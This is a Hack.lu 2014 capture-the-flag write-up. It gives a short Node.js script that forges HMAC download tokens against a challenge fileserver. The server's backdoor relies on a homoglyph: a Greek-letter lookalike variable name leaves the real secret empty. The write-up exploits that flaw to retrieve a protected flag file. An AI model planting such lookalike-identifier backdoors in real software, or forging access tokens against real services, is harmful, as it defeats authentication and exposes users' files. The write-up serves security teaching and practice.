---
layout: post
title: "Hidden in ρlaιn sιght"
date: 2014-10-23
ctf: Hack.lu 2014
author: Mihai
---

Write-up
--------

{% highlight js %}

#!/usr/bin/env nodejs

//Requirements
//---------------------------------------------------------------------------

//At our software development company, one of the top developers left in anger.
//He told us that he had hidden a backdoor in our node.js server application – 
//he thinks that we can't find it even if we try. I have attached the source code 
//of our fileserver. After registration, you can log in, upload files and create 
//access tokens for your files that others can use to retrieve them. He must have 
//added some way to retrieve files without permission. And we don't have version control, 
//so we can't just check his last commits. We have read the source code multiple times,
//but just can't figure out how he did it. Maybe he just lied? Can you help us and 
//demonstrate how the backdoor works? We have uploaded a file to “/files/testuser/flag.txt”
//please try to retrieve it.

//Connect to https://wildwildweb.fluxfingers.net:1409/. Note that all your files will be purged every 5 minutes.

//---------------------------------------------------------------------------

//1.install nodejs on local computer.
//2.setup env to nodejs (if using ubuntu)
//3.use the following methods from the downloadable code

var crypto = require('crypto')

var HMAC_SECRET = ''
for (var i=0; i<20; i++) {
  HMAC_SΕCRET = HMAC_SECRET + (Math.random()+'').substr(2)
}

//notice that the output of hmac_sign function in original code is static and depends on user and file.
//run function below to generate the download token for any desired user and file combination (e.g. testuser and file flag.txt)

var user="testuser"
var file="flag.txt"

function hmac_sign(user,file) {
  var hmac = crypto.createHmac('sha256', HMAC_SECRET)
  hmac.update(user+'/'+file)
  return hmac.digest('hex')
}

console.log(hmac_sign(""))
//use token to download flag at:
//https://wildwildweb.fluxfingers.net:1409/files/testuser/flag.txt/{token}
{% endhighlight %}